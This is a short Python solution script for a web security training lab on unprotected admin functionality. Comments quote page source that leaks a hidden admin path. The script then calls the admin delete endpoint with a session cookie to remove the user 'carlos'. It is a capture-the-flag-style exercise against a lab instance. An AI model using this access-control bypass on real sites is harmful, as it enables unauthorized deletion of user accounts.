# Lab: Unprotected admin functionality with unpredictable URL

import requests

url = "https://0a3f005b0453ef13816248e200af0066.web-security-academy.net/login"
'''
got hint:

<script>
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-aignlm');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}
</script>
'''    
#url = "https://0a3f005b0453ef13816248e200af0066.web-security-academy.net/admin-aignlm"
'''
got hint:
                            <span>wiener - </span>
                            <a href="/admin-aignlm/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin-aignlm/delete?username=carlos">Delete</a>
'''
url = "https://0a3f005b0453ef13816248e200af0066.web-security-academy.net/admin-aignlm/delete?username=carlos"
cookies ={
    'session':'QGYWmsVrw1l9gIK4GElTleEnwZpES1tf'
}

r = requests.get(url, cookies=cookies)
print(r.text)